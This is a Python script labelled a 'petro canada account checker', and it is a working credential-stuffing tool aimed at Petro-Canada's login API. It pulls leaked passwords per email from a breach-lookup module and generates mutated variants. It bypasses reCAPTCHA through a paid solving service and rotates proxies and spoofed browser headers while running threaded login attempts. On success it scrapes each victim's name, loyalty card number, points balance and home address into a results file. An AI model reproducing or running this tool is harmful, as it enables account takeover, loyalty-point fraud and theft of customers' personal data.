# author: obby
# date: 2023-05-13
# description: petro canada account checker

import requests
import urllib3
import random
import threading

from pysnus import main as snus
from logging import warning
from time import sleep
from anticaptchaofficial.recaptchav3proxyless import *

urllib3.disable_warnings()

class petro:
    def __init__(self):
        self.captchaSolver = recaptchaV3Proxyless()
        self.captchaSolver.set_verbose(1)
        self.captchaSolver.set_key(open(dataTracker.apiKeyFile, 'r').read().strip().rstrip())
        self.captchaSolver.set_website_url('https://www.petro-canada.ca/en/personal?modalUrl=%2Fen%2Fpersonal%2Flogin')
        self.captchaSolver.set_website_key('6LeuGYEjAAAAAOaPqAckgwRGjH2G09CFkxca7VkB')
        self.captchaSolver.set_page_action('login')
        self.captchaSolver.set_min_score(0.9)

    def login(self, email, password=None):
        self.email = email

        if not password:
            self.passwords = pws(self.email).sortedPasswords
        else:
            self.passwords = [password]
               

        for password in self.passwords:
            while True:
                try:
                    self.session = requests.Session()
                    self.variables()
                    self.session.verify = False

                    self.proxySetup()

                    self.json_data['email'] = email

                    warning(f'trying password: {self.email}:{password}')
                    self.json_data['password'] = password
                    self.password = password

                    self.captchaSolve = self.captchaSolver.solve_and_return_solution()
                    self.captchaCode = self.captchaSolve

                    self.json_data['recaptchaResponse'] = self.captchaCode

                    self.csrfTokenRequest = self.session.get(
                        'https://www.petro-canada.ca/en/personal?modalUrl=%2Fen%2Fpersonal%2Flogin',
                    )

                    self.csrfToken = self.csrfTokenRequest.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]

                    self.session.headers.update(
                        {
                            '__RequestVerificationToken': self.csrfToken,
                        }
                    )

                    self.loginResponse = self.session.post(
                        'https://www.petro-canada.ca/en/api/petrocanadaaccounts/signin',
                        params=self.params,
                        #cookies=cookies,
                        #headers=headers,
                        json=self.json_data,
                    )

                    warning(self.loginResponse.text)
                    warning(self.captchaCode)

                    if 'invalid.recaptcha' in self.loginResponse.text:
                        warning('captcha error')
                        self.captchaSolver.report_incorrect_recaptcha()
                        self.logCounts()
                        dataTracker.wrongCaptchas += 1
                        continue

                    if 'invalid.password' in self.loginResponse.text:
                        warning('password error')
                        self.captchaSolver.report_correct_recaptcha()
                        self.logCounts()
                        dataTracker.validAttempts += 1
                        break

                    if '"RedirectUrl":"/en/personal/my-petro-points"' in self.loginResponse.text:
                        warning('success')
                        self.captchaSolver.report_correct_recaptcha()
                        self.getDetails()
                        dataTracker.validAttempts += 1
                        dataTracker.realLogins += 1
                        self.logCounts()
                        return { 'status': 'success', 'success': True }
                    
                except requests.exceptions.ProxyError as e:
                    warning(e)
                    warning('proxy error')
                    continue

                except Exception as e:
                    warning(e)
                    warning('unknown error')
                    continue

        return { 'status': 'invalidPassword', 'success': True }
    
    def getDetails(self):
        self.details = self.session.get(
            'https://www.petro-canada.ca/en/personal/my-petro-points', 
        )

        self.detailsText = self.details.text

        self.petroCard = self.detailsText.split('<span class="visitor-dZropdown__card-number" data-hj-suppress>')[1].split('</span>')[0].strip().rstrip().replace(' ', '')
        self.petroAddress = self.detailsText.split('<div class="visitor-dropdown__street-address" data-hj-suppress>')[1].split('</div>')[0].strip().rstrip()
        self.petroName = self.detailsText.split('<div class="visitor-dropdown__full-name" data-hj-suppress>')[1].split('</div>')[0].strip().rstrip().replace('\n', '').replace(' ', '').replace('\r\n', '').replace('    ', '').replace('\n\n', '').split('\n')[0].replace('\r\r', ' ').replace('	', '')
        self.petroProvince = self.detailsText.split('<div class="visitor-dropdown__region" data-hj-suppress>')[1].split('</div>')[0].strip().rstrip()
        self.petroPoints = self.detailsText.split('<strong class="badge__value badge__value--large   ">')[1].split('</strong>')[0]
        warning(f'{self.email}:{self.password}:{self.petroName}:{self.petroCard}:{self.petroPoints}:{self.petroAddress}:{self.petroProvince}')
        print(f'{self.email}:{self.password}:{self.petroName}:{self.petroCard}:{self.petroPoints}:{self.petroAddress}:{self.petroProvince} ', file=open(dataTracker.resultsFile, 'a'))
        return True

    def proxySetup(self):
        self.proxyList = open(dataTracker.proxyFile, 'r').readlines()
        self.proxies = random.choice(self.proxyList).strip().rstrip()
        self.proxyDict = {
            'http': self.proxies,
            'https': self.proxies
        }
        self.session.proxies.update(self.proxyDict)

    def logCounts(self):
        warning(f'RealLogins={dataTracker.realLogins}:ValidAttempts={dataTracker.validAttempts}:WrongCaptchas={dataTracker.wrongCaptchas}')

    def variables(self):
        self.headerChoices = [
            {
                'authority': 'www.petro-canada.ca',
                '__RequestVerificationToken': '',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                # 'cookie': 'petrocanada#lang=en; shell#lang=en; ASP.NET_SessionId=gbuk53vpb4xlygszhcybre33; __RequestVerificationToken=sZWihEbTArt3t8hPI_oH6VJ527fTGXclefpUhC7FkDjHn-KjQFXdFcMx2StyMuJuRsd-1n5uG_TbNNLmshXyGlxqTeQ1; SC_ANALYTICS_GLOBAL_COOKIE=201d930f666f41aa923bccbe8343e586|True; .AspNet.Cookies=J5OcIx8EV8l6mwMFiFeEA5rJSYGCgwTAyTmyvUL5L7eier5ftGpS59eS731OqSvHmLpp5n-FHa8MExw12cUYnJxZxliDE315WnT87qYz5uIhqD30nikrPAWp94PSI62ChQWOH50pns1cYMZ3oN6R1SJQg7BeQQ30PuDCKCbLwc0IQhmt79kqqnVo_dHqgzuF-BlEGcDAC39ySs2O7P0DbUGGO9ccGKwCosU696Q2CzAFggfdZObtlJ9eZ26MlpjK93Eh515VVPzoyWrFBetiuY4w1Y6adopnZkay_KvluASK8KvRXxlWosB3aMWIIOsvZEnmEsUyU3hvmUanFeat73erc9jKBYxmUgBV-C1L8D2FiPsEGdstmfcNT_CBZp000GEGC9XScGl6pUvxKtZbuBMEzDCxXx-E1e0EC1GxQMmbOg3J',
                'origin': 'https://www.petro-canada.ca',
                'referer': 'https://www.petro-canada.ca/',
                'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Google Chrome";v="113"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5654.205 Safari/537.36',
            },
            {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.petro-canada.ca/',
            'content-type': 'application/json',
            '__RequestVerificationToken': '',
            'Origin': 'https://www.petro-canada.ca',
            'DNT': '1',
            'Connection': 'keep-alive',
            # 'Cookie': 'petrocanada#lang=en; shell#lang=en; ASP.NET_SessionId=ybrur2so4t53f52mcksi4coz; SC_ANALYTICS_GLOBAL_COOKIE=3995b00b8f5c474799c5d04b488e487e|False; __RequestVerificationToken=-RcaACxmlb9F8eovYg9Gi_zGGJpfZaoNJfY5fdmmAUK1wBK_9NE5sxf1DkEfANf8OkIOJ2ZXXuMa6gCPK71_9qYvc_s1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            # Requests doesn't support trailers
            # 'TE': 'trailers',
            },
        ]

        self.headers = random.choice(self.headerChoices)

        self.params = {
            'ds': 'C29039EA9E1C49A5BEC96D19CF0FEED4',
        }

        self.json_data = {
            'email': '',
            'password': '',
            'recaptchaResponse': '',
        }

        self.session.headers.update(self.headers)

class data:
    def __init__(self):
        self.dev = False

        if self.dev:
            self.devDir = '../devFiles/'
        else:
            self.devDir = ''

        self.proxyFile = f'{self.devDir}proxies.txt'
        self.emailsFile = f'{self.devDir}emails_testing.txt'
        self.apiKeyFile = f'{self.devDir}anticaptcha.txt'
        self.resultsFile = f'{self.devDir}results_newest.txt'

        self.validAttempts = 0
        self.realLogins = 0
        self.wrongCaptchas = 0
        self.threads = 15


class pws:
    def __init__(self, email):
        self.email = email
        self.sortedPasswords = []
        self.snus = snus()
        self.passwords = self.snus.getHashedPassword(self.email)
        self.sortPasswords()
        
    def sortPasswords(self):
        if not self.passwords:
            return

        for password in self.passwords:
            if password not in self.sortedPasswords: #uniques only
                pass
            else:
                continue

            if len(password) >= 8 and len(password) < 32: #is password over length 7 or equal to 7 and under 32
                pass
            else:
                continue

            if any(c.isalpha() for c in password):  #is any character a letter
                pass
            else:
                continue

            if any(i.isdigit() for i in password): #is any character a digit
                self.smartPassword = password
                self.smartPassword = self.smartPassword[0].upper() + self.smartPassword[1:]
                self.smartPassword += '!'
                if self.smartPassword != password and self.smartPassword not in self.sortedPasswords:
                    warning(f'smart:{self.email}:{self.smartPassword}')
                    self.sortedPasswords.append(self.smartPassword)
            else:
                continue

            if any(char.isupper() for char in password): #is any letter uppercase
                pass
            else:
                continue

            if any(not c.isalnum() for c in password): #is any character a symbol
                pass
            else:
                continue

            self.sortedPasswords.append(password)   

if __name__ == '__main__':
    dataTracker = data()
    emails = open(dataTracker.emailsFile, 'r').readlines()

    for email in emails:
        email = email.strip().rstrip()
        password = None

        try:
            email, password = email.split(':')
        except Exception as e:
            warning(f'didnt detect a password for {email}')

        if threading.active_count() < dataTracker.threads:
            petroSess = petro()
            loginThread = threading.Thread(target=petroSess.login, args=[email], kwargs={'password': password})
            loginThread.start()
            warning(f'started thread for {email}')
        else:
            warning('too many threads')
            sleep(2)